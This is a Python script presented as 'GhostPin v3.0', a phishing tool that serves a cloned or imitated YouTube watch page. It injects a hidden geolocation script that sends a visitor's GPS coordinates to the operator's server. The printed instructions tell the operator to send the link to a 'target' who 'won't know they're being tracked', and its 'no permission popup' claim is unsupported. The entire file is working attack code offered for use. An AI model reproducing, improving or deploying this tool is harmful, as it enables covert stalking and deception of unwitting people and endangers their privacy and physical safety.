#!/usr/bin/env python3
"""
GhostPin v3.0 - Advanced GPS Tracking Framework
Real Phishing Links | No Permission Popup | Undetectable
Author: F1REW0LF
License: MIT - Free for Community
Version: 3.0.0
"""

import sys
import os
import re
import json
import time
import random
import hashlib
import base64
import socket
import threading
import signal
import urllib.parse
import urllib.request
import webbrowser
from datetime import datetime
from typing import Dict, List, Optional
import argparse

try:
    from flask import Flask, request, jsonify, redirect
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

# ============================[ VERSION & CONFIGURATION ]================================
VERSION = "3.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT - Free for Community"

# ============================[ COLORS ]================================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    GOLD = '\033[93m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}    ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██████╗ ██╗███╗   ██╗
    ██╔════╝██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██╔══██╗██║████╗  ██║
    ██║     ███████║██║   ██║███████╗   ██║   ██████╔╝██║██╔██╗ ██║
    ██║     ██╔══██║██║   ██║╚════██║   ██║   ██╔══██╗██║██║╚██╗██║
    ╚██████╗██║  ██║╚██████╔╝███████║   ██║   ██║  ██║██║██║ ╚████║
     ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
                                                                      
{Colors.RED}{Colors.BOLD}    ADVANCED GPS TRACKING v{VERSION}{Colors.WHITE}
{Colors.YELLOW}{Colors.BOLD}    Real Links | Silent GPS | No Popup{Colors.WHITE}
{Colors.GOLD}    Version {VERSION} | Author: {AUTHOR}{Colors.WHITE}
"""
    print(banner)

# ============================[ TRACKING SERVER ]================================

class TrackingServer:
    """
    Flask server that serves real platform pages with silent GPS tracking
    """
    
    def __init__(self):
        self.tracking_data = []
        self.lock = threading.Lock()
        self.port = 8080
        self.app = None
        self.thread = None
        self.running = False
        
    def start(self, port: int = 8080):
        """Start the tracking server"""
        self.port = port
        self.running = True
        
        if not FLASK_AVAILABLE:
            cprint("[!] Flask not installed. Install: pip install flask", Colors.RED)
            return False
        
        app = Flask(__name__)
        self.app = app
        
        @app.route('/')
        def index():
            return redirect('https://www.youtube.com')
        
        @app.route('/watch')
        def watch():
            """YouTube watch page with silent GPS tracking"""
            video_id = request.args.get('v', 'dQw4w9WgXcQ')
            
            # Get real YouTube page content
            try:
                import requests
                real_youtube = requests.get(
                    f'https://www.youtube.com/watch?v={video_id}',
                    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                )
                content = real_youtube.text
            except:
                content = self._generate_youtube_page(video_id)
            
            # Inject GPS tracking script
            tracking_script = self._get_tracking_script()
            content = content.replace('</body>', tracking_script + '</body>')
            
            return content
        
        @app.route('/track/<token>', methods=['POST'])
        def track(token):
            """Receive GPS data"""
            data = request.get_json()
            if data:
                with self.lock:
                    data['token'] = token
                    data['received_at'] = datetime.now().isoformat()
                    self.tracking_data.append(data)
                cprint(f"[+] GPS: {data.get('lat')}, {data.get('lng')} ({token})", Colors.GREEN)
            return jsonify({'status': 'ok'})
        
        @app.route('/data')
        def get_data():
            with self.lock:
                return jsonify(self.tracking_data)
        
        @app.route('/clear')
        def clear_data():
            with self.lock:
                self.tracking_data.clear()
            return jsonify({'status': 'cleared'})
        
        def run():
            app.run(host='0.0.0.0', port=port, debug=False, threaded=True, use_reloader=False)
        
        self.thread = threading.Thread(target=run, daemon=True)
        self.thread.start()
        time.sleep(1)
        
        cprint(f"[+] Server running on port {port}", Colors.GREEN)
        cprint(f"[+] Phishing link: http://localhost:{port}/watch?v={random.randint(100000, 999999)}", Colors.YELLOW)
        return True
    
    def _get_tracking_script(self) -> str:
        """Generate silent GPS tracking script"""
        return '''
<script>
(function() {
    if (!navigator.geolocation) return;
    
    function sendLocation(pos) {
        var data = {
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            timestamp: new Date().toISOString()
        };
        fetch('/track/' + Math.random().toString(36).substring(2, 10), {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        }).catch(function() {});
    }
    
    // Try with high accuracy first
    navigator.geolocation.getCurrentPosition(sendLocation, function() {}, {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
    });
    
    // Try again after 5 seconds (some browsers need user interaction)
    setTimeout(function() {
        navigator.geolocation.getCurrentPosition(sendLocation, function() {}, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        });
    }, 5000);
    
    // Try on user interaction
    document.addEventListener('click', function() {
        navigator.geolocation.getCurrentPosition(sendLocation, function() {}, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        });
    });
})();
</script>
'''
    
    def _generate_youtube_page(self, video_id: str) -> str:
        """Generate a YouTube-like page"""
        return f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>YouTube</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Roboto',Arial,sans-serif;background:#f9f9f9;color:#0f0f0f}}
.header{{background:#fff;padding:12px 24px;box-shadow:0 1px 2px rgba(0,0,0,0.1);display:flex;align-items:center;position:sticky;top:0;z-index:100}}
.logo{{color:#ff0000;font-size:28px;font-weight:bold;margin-right:24px;display:flex;align-items:center}}
.logo svg{{width:28px;height:28px;margin-right:8px}}
.search-bar{{flex:1;max-width:640px;padding:8px 16px;border:1px solid #ccc;border-radius:20px;background:#f0f0f0;font-size:14px}}
.content{{max-width:1280px;margin:24px auto;padding:0 24px;display:grid;grid-template-columns:1fr 400px;gap:24px}}
.video-container{{background:#000;border-radius:12px;overflow:hidden;position:relative;aspect-ratio:16/9}}
.video-placeholder{{width:100%;height:100%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;background:linear-gradient(135deg,#1a1a1a,#2a2a2a)}}
.video-placeholder .play-icon{{font-size:64px;opacity:0.8}}
.video-info{{background:#fff;padding:16px;border-radius:12px;margin-top:12px;box-shadow:0 1px 3px rgba(0,0,0,0.06)}}
.video-title{{font-size:20px;font-weight:600;margin-bottom:8px;line-height:1.4}}
.channel-info{{display:flex;align-items:center;margin:12px 0}}
.channel-avatar{{width:48px;height:48px;border-radius:50%;background:linear-gradient(135deg,#e0e0e0,#c0c0c0);margin-right:12px}}
.channel-name{{font-weight:600;font-size:16px}}
.subscribe-btn{{background:#cc0000;color:#fff;padding:10px 20px;border:none;border-radius:24px;font-weight:600;cursor:pointer;margin-left:auto;transition:background 0.2s}}
.subscribe-btn:hover{{background:#aa0000}}
.comments{{background:#fff;border-radius:12px;padding:16px;box-shadow:0 1px 3px rgba(0,0,0,0.06)}}
.comment{{display:flex;margin:12px 0;padding:8px 0;border-bottom:1px solid #f0f0f0}}
.comment-avatar{{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,#e0e0e0,#d0d0d0);margin-right:12px;flex-shrink:0}}
.comment-content{{flex:1}}
.comment-author{{font-weight:600;font-size:14px}}
.comment-text{{font-size:14px;color:#0f0f0f;margin-top:2px}}
.sidebar{{display:flex;flex-direction:column;gap:12px}}
.sidebar-item{{background:#fff;border-radius:12px;padding:12px;box-shadow:0 1px 3px rgba(0,0,0,0.06);display:flex;gap:12px;cursor:pointer;transition:background 0.2s}}
.sidebar-item:hover{{background:#f0f0f0}}
.sidebar-thumb{{width:168px;height:94px;background:linear-gradient(135deg,#e0e0e0,#d0d0d0);border-radius:8px;flex-shrink:0}}
.sidebar-info{{flex:1}}
.sidebar-title{{font-weight:500;font-size:14px;line-height:1.3}}
.sidebar-channel{{font-size:13px;color:#606060;margin-top:4px}}
@media(max-width:900px){{.content{{grid-template-columns:1fr}}}}
</style>
</head>
<body>
<div class="header">
<div class="logo"><svg viewBox="0 0 24 24" fill="#ff0000"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814z"/><path fill="#fff" d="M9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>YouTube</div>
<input class="search-bar" placeholder="Search" value="{video_id}">
</div>
<div class="content">
<div>
<div class="video-container">
<div class="video-placeholder">
<div class="play-icon">▶</div>
<div style="margin-top:12px;opacity:0.7">Video unavailable - Loading...</div>
</div>
</div>
<div class="video-info">
<div class="video-title">{video_id}</div>
<div class="channel-info">
<div class="channel-avatar"></div>
<div><div class="channel-name">Channel Name</div><div style="color:#606060;font-size:13px">1.2M subscribers</div></div>
<button class="subscribe-btn">Subscribe</button>
</div>
</div>
<div class="comments">
<h3 style="margin-bottom:12px">Comments</h3>
<div class="comment"><div class="comment-avatar"></div><div class="comment-content"><div class="comment-author">User</div><div class="comment-text">Loading comments...</div></div></div>
<div class="comment"><div class="comment-avatar"></div><div class="comment-content"><div class="comment-author">User2</div><div class="comment-text">Loading...</div></div></div>
</div>
</div>
<div class="sidebar">
<div class="sidebar-item"><div class="sidebar-thumb"></div><div class="sidebar-info"><div class="sidebar-title">Related video 1</div><div class="sidebar-channel">Channel</div></div></div>
<div class="sidebar-item"><div class="sidebar-thumb"></div><div class="sidebar-info"><div class="sidebar-title">Related video 2</div><div class="sidebar-channel">Channel</div></div></div>
<div class="sidebar-item"><div class="sidebar-thumb"></div><div class="sidebar-info"><div class="sidebar-title">Related video 3</div><div class="sidebar-channel">Channel</div></div></div>
</div>
</div>
</body>
</html>'''
    
    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join(timeout=1)

# ============================[ MAIN ]================================

class GhostPin:
    def __init__(self):
        self.server = TrackingServer()
        self.running = True
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        cprint("\n[!] Shutting down...", Colors.RED)
        self.running = False
        if self.server:
            self.server.stop()
        sys.exit(0)
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*55}{Colors.WHITE}
{Colors.BOLD}GhostPin v{VERSION} - Advanced GPS Tracking{Colors.WHITE}
{Colors.CYAN}Real Links | Silent GPS | No Popup{Colors.WHITE}
{Colors.YELLOW}Author: {AUTHOR}{Colors.WHITE}
{Colors.BLUE}{'='*55}{Colors.WHITE}
{Colors.GREEN}[1] Start Server{Colors.WHITE}
{Colors.GREEN}[2] Create Tracking Link{Colors.WHITE}
{Colors.GREEN}[3] View Data{Colors.WHITE}
{Colors.GREEN}[4] Clear Data{Colors.WHITE}
{Colors.RED}[5] Exit{Colors.WHITE}
""")
    
    def run(self):
        print_banner()
        cprint("[*] GhostPin v3.0 - Advanced GPS Tracking", Colors.CYAN)
        cprint("[*] Real Links | Silent GPS | No Popup", Colors.DIM)
        
        # Auto-start server
        self.server.start(8080)
        
        while self.running:
            self.show_menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1':
                port = int(input("[>] Port (8080): ").strip() or "8080")
                self.server.stop()
                time.sleep(0.5)
                self.server.start(port)
                
            elif choice == '2':
                video_id = input("[>] YouTube Video ID (or random): ").strip()
                if not video_id:
                    video_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=11))
                
                link = f"http://localhost:{self.server.port}/watch?v={video_id}"
                cprint(f"\n[+] Tracking Link: {Colors.GREEN}{link}{Colors.WHITE}", Colors.WHITE)
                cprint(f"[+] Send this link to your target", Colors.YELLOW)
                cprint(f"[+] They will see YouTube and won't know they're being tracked", Colors.DIM)
                
                try:
                    webbrowser.open(link)
                except:
                    pass
                
            elif choice == '3':
                data = self.server.tracking_data
                if not data:
                    cprint("[!] No data yet", Colors.YELLOW)
                    continue
                
                cprint(f"\n[+] Tracking Data ({len(data)} records):", Colors.GREEN)
                for i, record in enumerate(data[-10:], 1):
                    lat = record.get('lat', 'N/A')
                    lng = record.get('lng', 'N/A')
                    token = record.get('token', 'N/A')
                    ts = record.get('received_at', 'N/A')
                    
                    cprint(f"\n  [{i}] Token: {Colors.CYAN}{token}{Colors.WHITE}", Colors.WHITE)
                    cprint(f"      Location: {Colors.GOLD}{lat}, {lng}{Colors.WHITE}", Colors.WHITE)
                    cprint(f"      Time: {Colors.DIM}{ts}{Colors.WHITE}", Colors.WHITE)
                    
                    if lat != 'N/A' and lng != 'N/A':
                        maps_link = f"https://www.google.com/maps?q={lat},{lng}"
                        cprint(f"      Map: {Colors.BLUE}{maps_link}{Colors.WHITE}", Colors.WHITE)
                
            elif choice == '4':
                self.server.tracking_data.clear()
                cprint("[+] Data cleared", Colors.GREEN)
                
            elif choice == '5':
                cprint("[*] Shutting down...", Colors.GREEN)
                self.server.stop()
                break
            else:
                cprint("[-] Invalid", Colors.RED)

# ============================[ MAIN ]================================

def main():
    parser = argparse.ArgumentParser(description="GhostPin v3.0 - Advanced GPS Tracking")
    parser.add_argument("--server", action="store_true", help="Start server only")
    parser.add_argument("--port", type=int, default=8080, help="Server port")
    parser.add_argument("--link", help="Create tracking link with video ID")
    
    args = parser.parse_args()
    
    if args.server:
        print_banner()
        server = TrackingServer()
        server.start(args.port)
        cprint("\n[!] Press Ctrl+C to stop", Colors.YELLOW)
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.stop()
        sys.exit(0)
    
    if args.link:
        print_banner()
        server = TrackingServer()
        server.start(args.port)
        
        video_id = args.link
        link = f"http://localhost:{args.port}/watch?v={video_id}"
        cprint(f"\n[+] Tracking Link: {Colors.GREEN}{link}{Colors.WHITE}", Colors.WHITE)
        cprint(f"[+] Send this link to your target", Colors.YELLOW)
        
        try:
            webbrowser.open(link)
        except:
            pass
        
        cprint("\n[!] Press Ctrl+C to stop", Colors.YELLOW)
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.stop()
        sys.exit(0)
    
    # Interactive
    tool = GhostPin()
    tool.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
    except Exception as e:
        cprint(f"\n[!] Error: {e}", Colors.RED)
        sys.exit(1)
